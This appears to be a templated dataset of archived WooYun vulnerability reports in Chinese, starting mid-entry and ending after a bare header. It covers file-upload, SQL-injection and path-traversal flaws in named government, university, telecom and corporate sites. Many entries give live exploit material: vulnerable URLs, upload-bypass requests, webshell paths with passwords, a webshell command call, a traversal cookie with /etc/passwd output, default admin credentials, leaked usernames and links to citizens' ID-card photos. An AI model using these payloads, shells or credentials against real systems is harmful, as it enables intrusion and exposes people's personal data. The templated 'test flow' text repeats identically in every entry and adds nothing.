**详情**: 刚看到学校新开了一个助学二学历预报名系统，就顺手一试，问题还不少首先注入点http://zkzs.nau.edu.cn/1/sm.asp?id=1很快就跑到了后台管理密码，还是明文存储，另外这个密码直接就是一个弱口令，q开头、p结尾，看看键盘就知道了进入后台预报名了二学历的妹子真不少，身份证（qq字段）、手机、宿舍（想想还有点小激动呢）、班级、学号等等信息都有学长的打码技术有限。。。。不要吐槽我。。。因为本来就有这个系统主站的后门（好吧，我错了，写完这个我就去提交另一个洞洞。。。），所以直接菜刀连上去，看到上传处妹子的照片真尼玛多然后在一堆图片里看到。。。。耶呵，有人来过，5月21号和6月18号，都是"时间戳.asp",应该还有上传漏洞，怀揣着保护学妹的各种伟大精神，再看看去退出管理后，妹子们的信息照样看，没有任何过滤和验证措施，猜猜id呗比如：http://zkzs.nau.edu.cn

**POC**: 如上

**绕过**: 直接利用

**修复**: 可以看到smbody.asp接收“id”参数时未有任何过滤就直接进入数据查询了，好典型的注入点。。。。。。敏感信息要做好权限限制访问，密码不要太弱。。。上传处还要加强限制记得把那些无聊人士的后门删了，密码都是5858
---

---
### [wooyun-2013-029018] 广西省最大人力资源网站漏洞泄露大量求职者信息
**厂商**: 广西壮族自治区人力资源和社会保障厅 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞是前两天发现的，因为有农活要做，所以提交迟了一天，望谅解。即将出去实习，就去关注了一下人才网的招聘信息，当要求填写信息时，刚想上传一张靓照，突发奇想，发生了如下令人伤心的一幕：判断根据文件特征，导致任意文件格式均可欺骗上传抓包得到地址：一阵窃喜~ 但是…. 505错误，悲剧了换aspx上传！编译器错误，又是一个悲剧：期间我还遇到404错误，解析成功却无法连接，还尝试上传大小马，大马只能显示登陆界面，功能失效。各种曲曲折折，难题困扰了我到凌晨两点，至今还想不懂原由，有安全狗？不太像…目录限制吧。后来我尝试了一种奇葩的方法，图片头+asp一句话+asp.net一句话，aspx一句话是在抓包修改提交的时候直接加上去的。结果成功连接（隔一段时间连接时又出现404错误，过久一点又恢复正常，高人望解答）：

**POC**: 话说刚改版不久，都是使用这套程序，所以…..全部沦陷！ 人才网覆盖全广西！！配置文件信息：每个站什么密码都有，密码齐全了，这个后果有点大目测数据库服务器为172.19.10.101 附近… 测试到此为止，事关重大，最快速度汇报

**绕过**: 直接利用

**修复**: 发现某分站内存在一句话木马！！！！！！管理员，2013-01-02 这半年来你？还有我注册完账号之后，马上有一个QQ号为1915859247（广西人才…）加我，如果是你们的人员，那就忽略，如果不是你们的人员，那.…修复完成后全部改一次密码吧。不怪程序员，真的不怪，信息泄露往往就是小缺陷造成的，常检查
---

---
### [wooyun-2014-087732] 某企业网站程序存在任意文件上传和SQL注射漏洞
**厂商**: 某企业网站程序 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某企业网站程序存在任意文件上传和SQL注射漏洞。关键字搜索：inurl:zhaoshang.asp?bid=1.SQL注射。案例如下：http://www.tangciliucao.cn/zhaoshang.asp?bid=22&sid=70http://www.powerhg.com/zhaoshang.asp?bid=22&sid=70http://www.pxtl.com/dj/zhaoshang.asp?bid=22&sid=70http://www.jsszpc.com/zhaoshang.asp?bid=22&sid=70http://www.china-saint.com/zhaoshang.asp?bid=22&sid=70http://www.jsszpc.com/zhaoshang.asp?bid=22&sid=70http://www.jindamuye.com/zh

**POC**: 2.存在任意文件上传漏洞，可直接上传asp文件。上传漏洞地址：/upload_flash.asp给出案例如下：http://www.hnsying.com/upload_flash.asphttp://www.jindamuye.com/upload_flash.asphttp://www.china-saint.com/upload_flash.asphttp://www.tangciliucao.cn/upload_flash.asphttp://www.zjwish.com//upload_flash.asphttp://www.pxtl.com/dj/upload_flash.asp证

**绕过**: 直接利用

**修复**: 求过呀...一定要过呀！
---

---
### [wooyun-2013-021106] 【盛大180天渗透纪实】第六章.红色警戒 （共库+上传=用户重要资料）
**厂商**: 盛大在线 | **年份**: 2013 | **类型**: 账户体系控制不严

**元思考**: 触发信号: 认证接口, 上传功能, 后台管理

**洞察**: 账户体系控制不严防护不足，开发者信任前端输入

**测试流程**:
1. 识别账户体系控制不严相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 拿到图片上传服务器后，并没有停止脚步，因为这个IP段的主机挺多的，继续进行同IP段的主机扫描。。。发现了一个盛大客服应用后台：http://service.os.sdo.com/frames/login.aspx各种弱口令爆破不成功。。。返回图片上传服务器。。。在数据库遍历中，突然发现了一个问题。。上次81端口服务器中也有数据表AUTH_USER，应该AUTH_USER是每个后台应用盛大基友的登录数据。。而在这个图片服务器中，不仅有AUTH_USER表，还有PerAdminSys_系列表不过翻看这站，貌似没有后台应用啊。。。难道。。 存在数据库共用？？ 这不是一个站的数据库，而是多个站共用数据库？如果是共用，那么此表对应的后台在哪呢。。。难道就是http://service.os.sdo.com ？？？于是打开了PerAdminSys_UserInfo表，找到了一些管理员信息。和AUTH_

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 由于数据量较大，一旦被不法分子获取，这些数据可是能有用的啊，有了密保问题和答案，以及新密码、历史密码、联系方式。。。  不敢想象了，不仅仅会是盗号。。更有可能冒充盛大客服进行进一步诈骗！！希望盛大引起足够重视，尽快修补此漏洞！·检查并清除本例中涉及的服务器Shell。·各个应用数据库应该分开。·加强
---

---
### [wooyun-2015-0122838] 某省级网上办事大厅存在任意文件上传漏洞（可能影响众多企业法人信息）
**厂商**: 某省级网上办事大厅 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 福建省网上办事大厅问题出在注册功能（法人用户注册）此处有个上传图片功能上传一张图片后抓包,可以得到以下POST http://www.fjbs.gov.cn/AppFile.action?fn=upload HTTP/1.1Accept: text/*Content-Type: multipart/form-data; boundary=----------Ef1ae0ae0cH2ei4KM7gL6GI3KM7ei4User-Agent: Shockwave FlashHost: www.fjbs.gov.cnContent-Length: 662Connection: Keep-AlivePragma: no-cacheCookie: JSESSIONID=72EC54DE5E80DA5D0B1BFDA78F2514F1; CNZZDATA1254004469=1094158662-14

**POC**: 对上面的数据包中的fileext进行修改，加上jspx即可（系统对jsp马有限制上传）Content-Disposition: form-data; name="fileext"*.gif;*.jpg;*.jpeg;*.png;*.jspx;上传一句话上传成功后服务器会返回文件路径一句话地址：upload/80B6F7EFCC3D2930ECA8CF14497BE937_wooyun.jspx密码：woo0yunhttp://www.fjbs.gov.cnhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/80B6F7EFCC3D2930

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2013-047368] 酷派分站任意文件读取漏洞
**厂商**: www.yulong.com | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入, 上传功能

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 已公开漏洞里面看到客服站上传文件验证处,js验证文件后缀的,就多事了一下.0x1 kf2.coolpad.cn/upload.php, 属于未授权访问js判断有无上传权限,检查后缀.本地构造提交.上传去掉if(parent.m_success==undefined){return false;}filter=加|php|,返回200.找不到路径,也不知道服务器再次验证了没有.0x2任意文件读取cookie 参数可以造成任意文件读取,Cookie: customer_service_language=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F../etc/passwd%00,需要%00截断.iframe_brief.php和upload.php都存在,没找到别的php文件,没测试.

**POC**: root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mai

**绕过**: 截断攻击

**修复**: php文件有没有上传上去,求确认!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
---

---
### [wooyun-2015-0144399] 某身份证照片认证平台FCK漏洞可导致大量居民身份证信息泄漏
**厂商**: 江西科泰华信息技术有限公司 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: FCK：http://**.**.**.**/fckeditor/editor/filemanager/browser/default/connectors/test.htmlaspx的，发现一枚aspx大马，默认密码admin进去，提权拿下服务器。**.**.**.**:3391帐号wooyun密码wooyunwooyun进去看了下，什么也没动http://**.**.**.**/WebSite/FCKFiles/Image/AspxSpy2014Final.aspx密码admin数据库大量身份证是肯定的，懒得看了。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 不会
---

---
### [wooyun-2013-045393] 某广播电视网系统任意文件上传漏洞
**厂商**: 某广播电视网 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.lzgd.com.cn/http://oa.lzgd.com.cn:8000/OA使用了通达的系统。然后有个任意上传WooYun: 通达OA存在任意文件上传漏洞机器在域内。可继续渗透随便截了几个图.. 证明我来过。 我什么都没干。

**POC**: 见详细说明。

**绕过**: 直接利用

**修复**: 及时更新系统..
---

---
### [wooyun-2014-063724] 中国移动通信某管理平台弱口令几任意文件上传漏洞
**厂商**: 中国移动通信 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 中国移动绥化移动分公司服务监督管理系统http://222.32.90.7:8080/弱口令：admin 123456编辑器附件上传那里可以上传任意文件！到这里就不深究了，马上提交，测试上传的文件和后门那目录打不开，你们自己解决吧！

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们懂得！
---

---
### [wooyun-2012-07435] 东软的高校数字校园平台上传漏洞
**厂商**: 东软集团 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 东软的这个数字校园平台用于高校实现统一的门户平台管理、统一的身份管理以及统一的数据标准管理，其客户包括中国人民大学、暨南大学、西北工业大学等（其开发的其他行业中的程序是否存在这个漏洞未测试），该平台采用tinymce编辑器，这个编辑器本身不存在漏洞，东软进行了修改，在tiny_mce/plugins/advimage/uoload.jsp页面，查看源代码：本地构造上传表单，白名单中加上jsp, 上传后可直接在源代码中查看后门地址由于高校数字校园平台都需要该校的账号才能进入，漏洞利用存在一定难度，测试本校成功后，网上找了人民大学的账号进行了测试，成功。

**POC**: http://portal.ruc.edu.cn/eapdomain/1.txt

**绕过**: 直接利用

**修复**: 重写上传页面。
---

---
### [wooyun-2015-0156315] 浙江中控集团某子站任意文件上传
**厂商**: 浙江中控 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在http://**.**.**.**上，问题文件http://**.**.**.**/fileupload/FileUpload.htm需要用IE浏览器，将文件名后缀改为mp3，然后burp suite改包，绕过js检测然后就会返回上传的文件名上传后的路径在http://**.**.**.**/fileupload/filename.ext

**POC**: webshell地址http://**.**.**.**/fileupload/file/6358286351503125000.aspx密码admin已经成了马场了上传一个cmd.exe就可以执行命令了cmd的路径D:\web\**.**.**.**\fileupload\file\win32.exe（其实我上传的是一个提权文件，捂脸逃....）可以看到是内网

**绕过**: 过滤绕过

**修复**: 1.删除已经上传的木马2.文件上传后端检测
---

---
### [wooyun-2013-046091] 某政务类CMS任意文件上传第二发（还是通用）
**厂商**: cncert国家互联网应急中心 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某一个action有点问题，可以用00截断截断文件名，然后……http://www.zjna.gov.cn/ecoi/upload.jsppost数据到http://www.zjna.gov.cn/ecoi/lee/upload.action

**POC**: 给一个POST的数据包的例子：POST http://www.zjna.gov.cn/ecoi/lee/upload.action HTTP/1.1Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*Referer: http://www.zjna.go

**绕过**: 截断攻击

**修复**: 上传白名单
---

---
### [wooyun-2015-0109554] 珠海市某网上申报系统任意文件上传+任意文件下载
**厂商**: 珠海市科技工贸和信息化局 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 目标地址：http://219.131.221.59:8080/任意文件下载：http://219.131.221.59:8080/download.fe?filePath=/WEB-INF/web.xml

**POC**: 任意文件上传，可直接上传jsp文件：http://219.131.221.59:8080/common/uploadFile.jspPOST http://219.131.221.59:8080/common/uploadFile.jsp?action=save&savePath=/imageshttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/&fileName=15042815250003.jpg.jsp&title1= ļ  ϴ &title2=ѡ   ļ   &allowsize=null HTTP/1.1Accept: text

**绕过**: 直接利用

**修复**: 控制上传页面访问权限，过滤
---

---
### [wooyun-2012-06229] 正方教育管理软件遍历目录漏洞
**厂商**: 正方教育管理软件 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题出在ftb.imagegallery.aspx这个文件上，没有过滤  /利用方式很简单：ftb.imagegallery.aspx?frame=1&rif=..&cif=\..

**POC**: 问题出在ftb.imagegallery.aspx这个文件上，没有过滤  /利用方式很简单：ftb.imagegallery.aspx?frame=1&rif=..&cif=\..

**绕过**: 直接利用

**修复**: 过滤斜杠就可以了
---

---
### [wooyun-2012-011474] 浙江宁波社保局任意文件上传
**厂商**: 浙江宁波社保局网 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.zjnb.lss.gov.cn/system/FunPages/Frame.jsp?FileName=UpFileForm.jsp&Path=/Files可以任意上传JSP文件，文件保存目录可以自定，修改/files即可。未对上传文件重命名！

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强验证，重命名上传文件
---

---
### [wooyun-2013-023560] 陕西省统计局存在任意文件上传导致被挂马
**厂商**: 陕西省统计局 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.sn.stats.gov.cn/zmhd.asp?menuId=2011&pmenuId=20建议提交页面附件上传直接ASP成功

**POC**: 然后此漏洞已经被黑帽利用挂上了黄色网址

**绕过**: 直接利用

**修复**: 限制上传类型
---

---
### [wooyun-2014-051848] 新疆维吾尔自治区粮食局任意文件上传
**厂商**: 新疆维吾尔自治区 粮食局 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 任意文件上传导致代码执行。

**POC**: 路径http://www.xjgrain.gov.cn:8080//system/resource/smalledit/upimage.jsp?actiontype=uploadprepic&dbName=vsb&ownerName=&owner=抓包修改扩展名，直接任意文件传入。界面shell截图木马地址是http://www.xjgrain.gov.cn:8080//_mediafile/contribute/imagefilepreview/2014/02/23/201402231d8jnr65vo.jsp

**绕过**: 直接利用

**修复**: 升级补丁。找西安那个公司。
---

---
### [wooyun-2013-035250] 改图网：一个上传引起的血案(改图网2台服务器全部渗透)
**厂商**: gaitu.com | **年份**: 2013 | **类型**: 成功的入侵事件

**元思考**: 触发信号: 认证接口, 上传功能, 后台管理

**洞察**: 成功的入侵事件防护不足，开发者信任前端输入

**测试流程**:
1. 识别成功的入侵事件相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 看乌云的上一个仁兄WooYun: 改图网某个分域名存在任意文件上传漏洞可导致主站沦陷的 应该不是一个  因为我这是2个。(ˇˍˇ）ok 直接说主题：漏洞是上传：这2个点不在一个服务器上  所以 和楼上仁兄的不是一个洞。http://help.gaitu.com/FCKeditor/editor/fckeditor.htmlhttp://mana.gaitu.com/fckeditor/editor/fckeditor.html注意  不是一个服务器  而且  不是一个手法  只是列出了都有漏洞ok http://help.gaitu.com/ 的上传 拿下权限：注：6G的数据库啊然后看了下  权限很大 servU 神马都有  2008的系统 想提权，但是似乎3389连不上哦先放放  然后就看见数据库连接了然后就是连接 SA权限哦  在表中找到神马了？  管理后台账号密码！ 208个管理但是

**POC**: 注：6G的数据库啊然后看了下  权限很大 servU 神马都有  2008的系统 想提权，但是似乎3389连不上哦先放放  然后就看见数据库连接了然后就是连接 SA权限哦  在表中找到神马了？  管理后台账号密码！ 208个管理但是后台在哪？继续翻远程连接？  ok  ip反查   查到了  mana.gaitu.com 改图网后台登录页面ok 破解登陆：各种权限：服务器权限一样大：ok  115.238.101.214   219.139.240.190  测试完毕。  先到这里吧

**绕过**: 直接利用

**修复**: 你们懂得 5台服务器 基本都不安全  好好设置下吧。求礼物 求rank。
---

---
### [wooyun-2013-034022] SKCMS上传漏洞
**厂商**: skcms.net | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 早晨刚上QQ，就有提示信箱收到个邮件，推广代码的，看了下主站，SKCMS，不熟悉啊，于是官方下了份，发现存在上传漏洞~~

**POC**: 上传页面上传个文件看看看看传到哪去了检验下成果做好上传权限和过滤吧~

**绕过**: 直接利用

**修复**: 我想你懂得的，做好上传权限和过滤吧~
---

---
### [wooyun-2015-0126091] 图们政府门户网任意文件上传
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.tumen.gov.cn//upfile_photo.asphttp://www.tumen.gov.cn/admin//FCKeditor/editor/filemanager/connectors/uploadtest.htmlhttp://www.tumen.gov.cn/admin//FCKeditor/editor/filemanager/connectors/test.html3个漏洞 http://www.tumen.gov.cn/news.asp?id=1202还有注人点

**POC**: http://www.tumen.gov.cn//upfile_photo.asphttp://www.tumen.gov.cn/admin//FCKeditor/editor/filemanager/connectors/uploadtest.htmlhttp://www.tumen.gov.cn/admin//FCKeditor/editor/filemanager/connectors/test.html

**绕过**: 直接利用

**修复**: 暑假在家 ==有礼物吗
---

---
### [wooyun-2016-0167812] 美的某平台部分安全问题
**厂商**: midea.com | **年份**: 2016 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://202.104.30.126/service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.release.InfoReleaseAction&method=createBBSRelease&TreeSelectedID=&TableSelectedID=.com/是用友NC-IUFO报表系统

**POC**: 详细漏洞利用可以看：WooYun: 用友NC-IUFO报表系统部分安全问题（影响多个大客户）这里跑出了部分：(LIGUIHUA)(LIUXY27)(NANJP)(YANMIAO)(ZHONGTR1)(huanghj2)(huangzy)(liusj)(lym)(mdvzhanglei)(qiufz1)(rainbow)(shenxy)(tuhongtao)(ufida)(ufida2)(ufida3)(yuanhh)(zhangjun)(zhangjun6)(zhanglei)(zhangxp)(zhongtr1)密码统一是123456可能是网站出现问题，并不能登陆进去。但也泄漏了内网的用户信

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-046144] 友情测试科大讯飞系列#4
**厂商**: 科大讯飞 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://cjgov.iflytek.com 讯飞电子采购系统http://cjgov.iflytek.com/ftb.imagegallery.aspx  编辑器漏洞  上传图片一句话，利用iis解析漏洞使用菜刀连一下可以，然后上次个spy.aspx 好分析不说了 都是泪，又是系统权限。。。能否不逗，认真对待？

**POC**: 见详细说明。

**绕过**: 直接利用

**修复**: 这个主要是编辑器的问题，删除编辑器这个页面即可，或者做访问控制。事先说明，数据库和内网我绝逼没有动，不信你们自己查，请根据系统重要性给我评分吧~
---

---
### [wooyun-2015-0162782] 农村管理和公共服务平台任意文件上传漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/FCKeditor/editor/filemanager/connectors/test.html#

**POC**: http://**.**.**.**/FCKeditor/editor/filemanager/connectors/test.html#

**绕过**: 直接利用

**修复**: 禁止访问
---

---
### [wooyun-2014-083758] 武汉工程大学教务管理系统漏洞打包
**厂商**: 武汉工程大学 | **年份**: 2014 | **类型**: 成功的入侵事件

**元思考**: 触发信号: 认证接口, 上传功能, 后台管理

**洞察**: 成功的入侵事件防护不足，开发者信任前端输入

**测试流程**:
1. 识别成功的入侵事件相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 教务管理地址http://218.199.176.2无验证马页面http://218.199.176.2/(rhkakirymynkt0vmrhdlzyqb)/default2.aspxhttp://218.199.176.2/(4333zb55spriyp45jbnmoaza)/default3.aspxhttp://218.199.176.2/(4333zb55spriyp45jbnmoaza)/default4.aspx上传漏洞http://218.199.176.2/fckeditor/editor/filemanager/browser/default/browser.html无验证马页面可以直接用burp爆破截取登陆突然不知道怎么了图片上传的好慢  口述一下吧再用sniper 改下下面这段post、POST /(rhkakirymynkt0vmrhdlzyqb)/default

**POC**: 部门处长的好求个号学习一下555

**绕过**: 直接利用

**修复**: 加验证码设置 正确权限
---

---
### [wooyun-2015-0123824] 某省电信商城任意文件上传导致大量公民信息泄露
**厂商**: 电信 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞地址：http://3gfs.net/order.php?id=192&type=zdq&num=1&tc=48&mstr=detail&mark=&shid=传马好像会被拦，于是，绕之：http://3gfs.net/img/id_pic/20150630164320.php?a=assert&b=phpinfo%28%29;列目录：http://3gfs.net/img/id_pic/20150630164320.php?a=system&b=dir由于功力太浅，未深入

**POC**: 大量公民身份证信息：http://3gfs.net/img/id_pic/20150501203200.jpghttp://3gfs.net/img/id_pic/20150502192948.jpghttp://3gfs.net/img/id_pic/20150502231709.jpghttp://3gfs.net/img/id_pic/20150502232004.jpghttp://3gfs.net/img/id_pic/20150503071655.jpghttp://3gfs.net/img/id_pic/20150503144324.jpghttp://3gfs.net/img/

**绕过**: 直接利用

**修复**: !
---

---
### [wooyun-2013-027053] 方付通商城某分站文件上传可拿下服务器（内部邮件系统、主站源码等泄露）
**厂商**: 方付通 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 好多敏感的东西 可用于渗透主站 而主站可以充各种点卡 甚至给支付宝充钱...url:http://f-roadpay.com.cn/froadpay/FCKeditor/editor/filemanager/browser/default/browser.html?type=File&connector=connectors/jsp/connector很低级的漏洞。。。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: null
---

---
### [wooyun-2013-043605] 山东省政府网站任意文件上传漏洞
**厂商**: 山东省人民政府 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题在http://www.shandong.gov.cn/col/col4789/index.html这里 给省长写信  到了写信页面 打开开发者工具  能上传的附件类型在前端可以修改！改为jsp的然后提交 获取信件编号和密码去查看信件 点击附件链接 拼接出上传地址

**POC**: 传上去的shell后台  不深入了

**绕过**: 直接利用

**修复**: 不要在前端验证和定义上传类型
---

---
### [wooyun-2014-080094] 盛大网络敏感信息泄漏大量源码任意文件上传(高管信息)
**厂商**: 盛大网络 | **年份**: 2014 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 上传功能

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 泄漏地址:https://ku6data.sdo.com存在目录历遍 下面看图不说话任意文件上传地址:https://ku6data.sdo.comhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/直接拖拽 好厉害

**POC**: 如上 稍微帖一点 很多文件比较大

**绕过**: 直接利用

**修复**: 你猜
---

---
### [wooyun-2015-0107061] 某数字化校园平台某处通用任意文件上传
**厂商**: 上海鼎创信息科技有限公司 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: inurl:EduPlate/XBYXApp/http://www.mlzx.net/EduPlate/XBYXApp/Web/ftb.insertFile.aspxhttp://www.psshn2c.pudong-edu.sh.cn/EduPlate/xbyxapp/ftb.insertFile.aspxhttp://www.jcsy.pudong-edu.sh.cn/EduPlate/XBYXApp/ftb.insertFile.aspxhttp://zpxx.nh.edu.sh.cn/eduplate/XBYXApp//ftb.insertFile.aspxhttp://tywx.mhedu.sh.cn/EduPlate/XBYXApp/ftb.insertFile.aspx

**POC**: 就拿一个来举例子，上传任意文件。

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-019602] GWF御用杀毒(大黄蜂)网站编辑器文件上传漏洞，导致官网沦陷
**厂商**: 大黄蜂杀毒 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 其实也就个小漏洞啦。直接爆菊花http://www.ihornet.cn/editor/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/php/upload.php?Type=Media

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 修复你比我厉害多了
---

---
### [wooyun-2014-068621] 深圳互联系统存在任意文件上传+SQL注射+弱口令+数据库可被下载漏洞
**厂商**: 国家互联网应急中心 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 后台管理

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

